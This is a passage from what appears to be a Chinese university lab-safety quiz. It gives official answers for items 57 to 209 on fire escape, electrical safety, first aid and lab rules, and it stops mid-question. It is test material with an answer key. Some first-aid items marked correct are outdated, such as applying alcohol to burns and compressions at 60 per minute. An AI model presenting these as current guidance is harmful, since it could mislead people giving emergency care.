<p>​     57、[判断题] <strong>实验大楼因出现火情发生浓烟时应迅速离开，当浓烟已穿入实验室内时，要沿地面匍匐前进，因地面层新鲜空气较多，不易中毒而窒息，有利于逃生。当逃到门口时，千万不要站立开门，以避免被大量浓烟熏倒。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     58、[判断题] <strong>消防队在扑救火灾时，有权根据灭火的需要，拆除或者破损临近火灾现场的建筑。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     59、[判断题] <strong>在扑灭电气火灾的明火时，用气体灭火器扑灭。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     60、[判断题] <strong>发现火灾时，单位或个人应该先自救，当自救无效、火越着越大时，再拨打火警电话119。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     61、[判断题] <strong>用灭火器灭火时,灭火器的喷射口应该对准火焰的中部。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     62、[判断题] <strong>灭火器材设置点附近不能堆放物品,以免影响灭火器的取用。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     63、[判断题] <strong>扑救气体火灾切忌盲目扑灭火势，首先应切断火势蔓延途径，然后疏散火势中压力容器或受到火焰辐射热威胁的压力 容器，不能疏散的部署水枪进行冷却保护。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     64、[判断题] <strong>若宿舍门外已被大火封死，要紧闭房门，用湿毛巾 等堵塞门缝，在室内等待救援。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     65、[判断题] <strong>火灾发生后，穿过浓烟逃生时，必须尽量贴近地面，并用湿毛巾捂住口鼻。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     66、[判断题] <strong>万一发生了火灾，不管是否是电气方面引起的，首先要想办法迅速切断火灾范围内的电源。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     67、[判断题] <strong>火灾对实验室构成的威胁最为严重，最为直接。应加强对火灾三要素（易燃物、助燃物、点火源）的控制。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     68、[判断题] <strong>灭火器按其移动形式可分为：手提式和推车式。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     69、[判断题] <strong>不得堵塞实验室逃生通道。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     70、[判断题] <strong>液体着火时，应用灭火器灭火，不能用水扑救或其 它物品扑打。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     71、[判断题] <strong>岗位消防安全“四知四会”中的“四会”是指：会报警，会使用消防器材，会扑救初期火灾，会逃生自救</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     72、[判断题] <strong>身上着火被熄灭后,应马上把粘在皮肤上的衣物脱下来。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     73、[判断题] <strong>实验室必须配备符合本室要求的消防器材，消防器材要放置在明显或便于拿取的位置。严禁任何人以任何借口把消防 器材移作它用。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     74、[判断题] <strong>电气设备着火，首先必须采取的措施是灭火。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     75、[判断题] <strong>实验室发生非火灾类事故，应立即报告单位负责人 和学校保卫处，设立警戒区并撤离无关人员，以减轻潜在危害。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     76、[判断题] <strong>火灾发生后，受到火势威胁时，要当机立断披上浸湿的衣物、被褥等向安全出口方向冲去。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     77、[判断题] <strong>在熟睡时，听到火警信号后正确的做法是：1、用手试一试门是否热，如是冷的，可开门逃生；2、准备好湿毛巾；3、切勿随意跳楼，自 制救生绳索后再设法安全着落；4、利用自然条件作为救生滑道。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     78、[判断题] <strong>同学发现宿舍楼的电闸箱起火，可以用楼内的消火栓灭火。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     79、[判断题] <strong>在着火和救火时，若衣服着火，要赶紧跑到空旷处用灭火器扑灭。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     80、[判断题] <strong>实验室内出现火情逃到室外走廊时，要尽量做到随手关门，这样一来可阻挡火势随人运动而迅速蔓延，增加逃生的有效时间。</strong>  （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     81、[判断题] <strong>实验大楼因出现火情发生浓烟时应迅速离开，当浓烟已穿入实验室内时，要沿地面匍匐前进，因地面层新鲜空气较多，不易中毒而窒息，有利于逃生。当逃到门口时，千万不要站立开门，以避免被大量浓烟熏倒。</strong>  （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     82、[判断题] <strong>实验室常用的灭火方法：用水灭火、砂土灭火、灭火器。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     83、[判断题] <strong>火灾对实验室构成的威胁最为严重，最为直接。应加强对火灾三要素（易燃物、助燃物、点火源）的控制。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     84、[判断题] <strong>仪器设备用电或线路发生故障着火时，应立即切断现场电源，将人员疏散，并组织人员用灭火器进行灭火。</strong>  （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     85、[判断题] <strong>单位消防安全制度主要包括以下内容：消防安全教育、培训；防火巡查、检查；安全疏散设施管理；消防（控制室）值班；消防设施、器材维护管理；火灾隐患整改；用火、用电安全管理；易燃易爆危险物品和场所防火防爆；专职和义务消防队的组织管理；灭火和应急疏散预案演练；燃气和电气的检查管理（包括防雷、防静电）；消防安全工作考评和奖惩；其他必要的消防安全内容。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     86、[判断题] <strong>灭火的四种方法是隔离法、窒息法、冷却法、化学抑制法。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     87、[判断题] <strong>在室外灭火时，应站在上风位置。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     88、[判断题] <strong>在熟睡时，听到火警信号后正确的做法是：1、用手试一试门是否热，如是冷的，可开门逃生；2、准备好湿毛巾；3、切勿随意跳楼，自制救生绳索后再设法安全着落；4、利用自然条件作为救生滑道。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     89、[判断题] <strong>电气设备发生火灾时，应注意：1、电气设备可能带电，可能发生触电事故；2、某些电气设备充有大量的油，可能发生喷油甚至爆炸。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     90、[判断题] <strong>实验大楼出现火情时千万不要乘电梯，因为电梯可能因停电或失控，同时又因“烟囱效应”，电梯井常常成为浓烟的流通道。</strong>   （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     91、[判断题] <strong>实验室内出现火情，若被困在室内时，应迅速打开水龙头，将所有可盛水的容器装满水，并把毛巾打湿。用湿毛巾捂嘴，可以遮住部分浓烟不被吸入。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     92、[判断题] <strong>实验室灭火的方法要针对起因选用合适的方法。一般小火可用湿布、石棉布或沙子覆盖燃烧物即可灭火。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     93、[判断题] <strong>大火封门无路可逃时，可用浸湿的被褥、衣物堵塞门缝，向门上泼水降温，以延缓火灾蔓延时间，呼叫待援。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     94、[判断题] <strong>消防工作的方针是：“预防为主，防消结合”，实行消防安全责任制。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     95、[判断题] <strong>当发生火情时尽快沿着疏散指示标志和安全出口方向迅速离开火场。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     96、[判断题] <strong>当电气设备发生火灾后，如果可能应当先断电后灭火。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     97、[判断题] <strong>火灾发生后，当所有的逃生线路被大火封锁时，应立即退回室内，用手电筒、挥舞衣物、呼叫等方式向窗外发送求救 信号，等待救援。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     98、[判断题] <strong>所有的火灾刚开始时都是小火，随着火灾的发展输出的热量越大，火灾蔓延的速度和范围也愈大，所以扑灭初起火灾 最容易的。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     99、[判断题] <strong>燃烧必须具备可燃物、助燃物和点火源三大条件，缺一不可。因此，可以采取尽量隔离的方式来防止实验室火灾的发生。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     100、[判断题] <strong>被困在电梯中应尽快扒开门脱险。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     101、[判断题] <strong>电气设备着火时，可以用水扑灭。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     102、[判断题] <strong>电气线路着火，要先切断电源，再用干粉灭火器或二氧化碳灭火器灭火，不可直接泼水灭火，以防触电或电气爆炸伤人。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     103、[判断题] <strong>灭火器按其移动形式可分为：手提式和推车式。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     104、[判断题] <strong>实验中遇到一般烫伤和烧伤，不要弄破水泡，在伤口处用95%的酒精轻涂伤口，涂上烫伤膏或涂一层凡士林油，再用纱布包扎。</strong>   （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     105、[判断题] <strong>为了防止盗窃事件的发生，临时离开实验室必须关门。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     106、[判断题] <strong>实验室内可以使用电炉、微波炉、电磁炉、电饭煲等取暖、做饭。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     107、[判断题] <strong>实验室内可以堆放个人物品。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     108、[判断题] <strong>节假日或假期在实验室做实验必须经导师批准，并报院系备案。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     109、[判断题] <strong>实验结束后，要关闭设备，断开电源，并将有关实验用品整理好。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     110、[判断题] <strong>电源插座、接线板、电线的容量应满足电器功率的需要。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     111、[判断题] <strong>为避免线路负荷过大，而引起火灾，功率1000瓦以上的设备不得共用一个接线板。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     112、[判断题] <strong>对于触电事故，应立即切断电源或用有绝缘性能的木棍棒挑开和隔绝电流，如果触电者的衣服干燥，又没有紧缠住身上，可以用一只手抓住他的衣服，拉离带电体；但救护人不得接触触电者的皮肤，也不能抓他的鞋。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     113、[判断题] <strong>实验室内应使用空气开关并配备必要的漏电保护器；电气设备应配备足够的用电功率和电线，不得超负荷用电；电气设备和大型仪器须接地良好，对电线老化等隐患要定期检查并及时排除。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     114、[判断题] <strong>大型仪器使用中，应注意仪器设备的接地、电磁辐射、网络等安全事项，避免事故发生。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     115、[判断题] <strong>实验室内的电线、开关、灯头、插头、插座等一切电器用具，要经常检查是否完好，有无漏电、潮湿、霉烂等情况。一旦有问题应立即报修。</strong>   （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     116、[判断题] <strong>实验室内禁止抽烟、进食。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     117、[判断题] <strong>发现被盗或人为破坏，应保护现场并立即报告保卫处。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     118、[判断题] <strong>实验室发生非火灾类事故，应立即报告单位负责人和学校保卫处，设立警戒区并撤离无关人员，以减轻潜在危害。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     119、[判断题] <strong>实验室内不得停放自行车、电动车、汽车。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     120、[判断题] <strong>只要不影响实验，可以在实验室洁净区域铺床睡觉。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     121、[判断题] <strong>在不影响实验室周围的走廊通行的情况,可以堆放仪器等杂物。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     122、[判断题] <strong>有易燃易爆危险品的实验室禁止使用明火。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     123、[判断题] <strong>不能将实验室易燃易爆物品带出实验室。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     124、[判断题] <strong>离开实验室前应检查门、窗、水龙头是否关好，通风设备、饮水设施、计算机、空调等是否已切断电源。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     125、[判断题] <strong>实验仪器使用时要有人在场，不得擅自离开。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     126、[判断题] <strong>实验进行前要了解实验仪器的使用说明及注意事项，实验过程中要严格按照操作规程进行操作。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     127、[判断题] <strong>未经允许不得随意拆卸实验仪器和设备。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     128、[判断题] <strong>学生进入实验室首先要了解实验室的安全注意事项。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     129、[判断题] <strong>可以用潮湿的手碰开关、电线和电器。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     130、[判断题] <strong>当手、脚或身体沾湿或站在潮湿的地板上时，切勿启动电源开关和触摸电气用具。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     131、[判断题] <strong>在实验室同时使用多种电气设备时，其总用电量和分线用电量均应小于设计容量。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     132、[判断题] <strong>计算机使用完毕后，应将显示器的电源关闭，以避免电源接通，产生瞬间的冲击电流。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     133、[判断题] <strong>触电事故是因电流流过人体而造成的。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     134、[判断题] <strong>为了预防电击（触电），电气设备的金属外壳须接地，最好是埋设接地电阻很小专用地线。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     135、[判断题] <strong>为保证安全用电，配电箱内所用的保险丝应该尽量粗。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     136、[判断题] <strong>在照明电路上可以不用安装漏电保护器。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     137、[判断题] <strong>为方便进出专人管理的设备房间，可自行配制钥匙。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     138、[判断题] <strong>国家秘密载体是指以文字、数据、符号、图形、图像、声音等方式记载国家秘密信息的纸介质、磁介质、光盘等各类物品。磁介质载体包括计算机硬盘、软盘和录音带、录像带等。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     139、[判断题] <strong>学生进入实验室学习、工作前应接受安全教育、培训，并通过考核。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     140、[判断题] <strong>禁止邮寄属于国家秘密的文件、资料和其他物品出境，禁止非法携运属于国家秘密的文件、资料和其他物品出境。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     141、[判断题] <strong>实验室应保持整洁有序，不准喧哗、打闹、抽烟。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     142、[判断题] <strong>在遇到高压电线断落地面时，导线断落点20米内，禁止人员进入。如果不慎在此范围内，应背朝电线断落点，采用单脚跳或双脚并跳，撤离现场。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     143、[判断题] <strong>一定强度的电场，磁场，电磁场都可能对人有损害。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     144、[判断题] <strong>使用电气设备时可以用两眼插头代替三眼插头。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     145、[判断题] <strong>不使用绝缘损坏或接地不良的电气设备。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     146、[判断题] <strong>负载处于工作状态时，可以插、拔、接电气线路。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     147、[判断题] <strong>接线时，要用合格的电源线，电源插头、插座。电源线接头要用绝缘胶布包好。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     148、[判断题] <strong>可以用湿布擦电源开关。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     149、[判断题] <strong>进行电气维修必须先关掉电源,在设置告知牌后，方可进行。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     150、[判断题] <strong>实验室的电源总闸没有必要每天离开时都关闭，只要关闭常用电气的电源即可。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     151、[判断题] <strong>电源插座附近不应堆放易燃物等杂物。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     152、[判断题] <strong>移动某些非固定安装的电气设备时(如电风扇，照明灯)，可以不必切断电源。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     153、[判断题] <strong>任何电气设备在未验明无电时，一律认为有电，不能盲目触及。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     154、[判断题] <strong>当断线落地或大电流从接地装置流入大地时，若人站在附近则可能在两脚之间产生跨步电压。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     155、[判断题] <strong>人体触电致死，是由于肝脏受到严重伤害。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     156、[判断题] <strong>实验室不得乱拉电线，套接接线板。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     157、[判断题] <strong>实验中遇到严重割伤，可在伤口上部10cm处用沙布扎紧，减慢流血，并立即送医院。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     158、[判断题] <strong>人工呼吸的方法是捏紧伤者鼻孔，深吸一口气后紧贴伤者的口向口内吹气，时间约为2秒钟，吹气完毕后，立即松开伤者的鼻孔，让他自行呼气，时间约3秒钟。如此以每分钟约12次的速度进行。</strong>   （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     159、[判断题] <strong>用手搬运重物时，应先以半蹲姿势，抓牢重物，然后用腿肌出力站起，切勿弯腰，以防伤及背部和腰。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     160、[判断题] <strong>电气设备和大型仪器须接地良好，对电线老化等隐患要定期检查并及时排除。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     161、[判断题] <strong>因实验需要，仪器设备可以随便拆装。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     162、[判断题] <strong>实验室应对仪器设备加强维护保养,定期校验和检修。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     163、[判断题] <strong>不准在车间打闹，不准随意攀登吊车、墙梯或者其它设备，不准在吊车吊运物体运行线上行走或停留。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     164、[判断题] <strong>使用电子门禁的大楼和实验室，应对各类人员设置相应的级别，对于门禁卡丢失、人员调动或离校等情况应及时采取措施，办理报失或移交手续。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     165、[判断题] <strong>实验室的接线板远离可能有水的位置和高温环境。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     166、[判断题] <strong>有关涉密的文件、资料的制作、保管建立病毒防护系统后可上网。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     167、[判断题] <strong>实验室安全与卫生工作应坚持“安全第一，预防为主”的原则。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     168、[判断题] <strong>在开放实验室，外来人员可随便操作实验室仪器设备。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     169、[判断题] <strong>胸外心脏挤压法：救护者跪在触电者一侧或骑跪在其腰部两侧，两手相迭，手掌根部放在伤者心窝上方、胸骨下，掌根用力垂直向下挤压，压出心脏里面的血液，挤压后迅速松开，胸部自动复原，血液充满心脏，以每分钟60次速度进行。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     170、[判断题] <strong>心脏骤停者应立即行胸外心脏按摩术，同时拨打120。现场抢救成功的心肺复苏患者或重症患者，如昏迷、惊厥、休克、深度青紫等，应立即送医院治疗。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     171、[判断题] <strong>实验中遇到一般割伤，应立即取出伤口内的异物，保持伤口干净，并用酒精棉清除伤口周围的污物，涂上外伤膏或消炎粉。</strong>  （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     172、[判断题] <strong>突发性不可抗拒的雷电、水灾、地震、房屋垮塌等自然灾害事故发生后，应在领导小组的指挥下，马上组织疏散、抢救现场工作人员或进行人员自助自救，以确保人员的人身安全，作好善后工作。</strong>   （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     173、[判断题] <strong>触电时，不可人去拉（可用木棒把伤员挑开），应立即切断电源，然后先做人工呼吸，再做心脏按压，同时报120送医院进行处理。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     174、[判断题] <strong>火或热水等引起的大面积烧伤、烫伤，必须用湿毛巾、湿布、湿棉被覆盖，然后送医院进行处理。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     175、[判断题] <strong>火或热水等引起的小面积烧伤、烫伤，必须用冷水冲洗30分钟以上，然后用烧伤膏涂抹，切不可用牙膏、酱油、盐等覆盖。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     176、[判断题] <strong>实施急救的顺序：若有呼吸心跳停止的，先行复苏，然后是止血、包扎、骨折固定或脱臼复位（固定）、搬运。</strong>  （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     177、[判断题] <strong>某人因机械操作不慎，致使左手食指从指根完全离断，急救处理首先是找器皿保存断指，然后包扎残端伤口止血。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     178、[判断题] <strong>急救时伤口包扎松劲适度，不可过紧或过松，以防滑脱或压迫神经和血管，影响远端血液循环，甚至造成肢体坏死。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     179、[判断题] <strong>急救时伤口包扎越紧越好。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     180、[判断题] <strong>发生意外后先对伤员进行必要的止血、包扎、固定等处理，然后尽可能用担架搬运，搬运时病人始终处脚朝前，头朝后，以便于随时观察伤者情况变化，及时实施急救处理。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     181、[判断题] <strong>护送病人时，应取掉口中异物，采用平卧位，头部稍低，保持呼吸畅通。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     182、[判断题] <strong>未经指导教师许可，不得搬弄仪器、设备，以及擅自开始实验。实验时，应注意安全，按要求操作，如发现异常立即停止。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     183、[判断题] <strong>空调电源必须单独拉线，不得使用接线板。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     184、[判断题] <strong>不得带着实验防护手套开门、翻阅书籍、使用电脑。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     185、[判断题] <strong>除非特殊需要并采取一定的安全保护措施，否则空调、计算机、饮水机等不得无人开机过夜。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     186、[判断题] <strong>实验室内电源根据需要可自行拆装、改线。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     187、[判断题] <strong>实验室钥匙的配发由实验室负责人管理，不得私自配置钥匙或借给他人使用。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     188、[判断题] <strong>不得堵塞实验室逃生通道。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     189、[判断题] <strong>普通实验室内，不得私自饲养实验动物。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     190、[判断题] <strong>实验室人员必须定期检查设备、水电线路、门窗等是否完好，如发现问题，必须及时进行维修。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     191、[判断题] <strong>遇到停电停水等情况，实验室人员必须检查电源和水源是否关闭，避免重新来电来水时发生相关安全事故。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     192、[判断题] <strong>实验室门口应挂上写有安全责任人的姓名和联系方式的牌子。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     193、[判断题] <strong>实验室应将相应的规章制度和操作规程挂到墙上或便于取阅的地方。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     194、[判断题] <strong>实验室内可以使用木制配电板、闸刀开关、花线电线。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     195、[判断题] <strong>仪器设备发生故障后，必须及时报告管理人员，并详细登记。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     196、[判断题] <strong>各学院每季度组织有关人员对实验室进行安全与卫生管理的例行检查，记录检查情况，提出存在的问题并限时整改。每次检查结束后须将检查结果形成报告，上报实验室处。</strong>  （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     197、[判断题] <strong>实验室地面出现溢水的主要原因之一是忘记关闭水龙头，尤其停水时忘关水龙头，因此离开实验室时要认真检查。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     198、[判断题] <strong>实验室如发现存在安全隐患，要及时向所在学院和实验室负责人、保卫处、实验室处报告，并采取措施进行整改。对安全隐患隐瞒不报或拖延上报的，学校将对相关责任人进行严肃处理。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     199、[判断题] <strong>夏季天气热时可以在实验室内穿露有脚趾的鞋。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     200、[判断题] <strong>实验室安全与卫生检查内容主要包括实验室布置、卫生、水电安全、冰箱与烘箱使用管理、危险品使用与保管、化学与生物废弃物（气、液、固态物）的处置、排污管理、气体钢瓶安全、放射性安全等。</strong>  （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     201、[判断题] <strong>要加强实验室排污处理装置（系统）的建设和管理，做到达标排放。实验废弃物不得倒入自来水下水道或普通垃圾箱等处。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     202、[判断题] <strong>应增强信息安全的意识，注意保护教学科研活动中实验技术参数、观测数据、实验分析结果及新的科学发现等资料。</strong>  （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     203、[判断题] <strong>建立健全安全管理规章制度，完善逐级安全责任制，贯彻执行“谁使用，谁管理”、“谁主管，谁负责”的安全工作原则。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     204、[判断题] <strong>实验室内彼此保持安静，不得进行娱乐活动。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     205、[判断题] <strong>与工作无关的外来人员不得进入实验室。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     206、[判断题] <strong>任何单位和个人不得在电子公告系统、聊天室、网络新闻组上发布、谈论和传播国家秘密信息。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     207、[判断题] <strong>上网信息的保密管理坚持“谁上网谁负责”的原则。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     208、[单选题]<strong>消防车和消火栓的颜色是：</strong> （分值1.0）</p>
<ul>
<li>A、白色<br> B、黄色<br> C、红色</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     209、[单选题]<strong>可以用水扑灭的火灾是下列哪种物质？</strong> （分值1.0）</p>
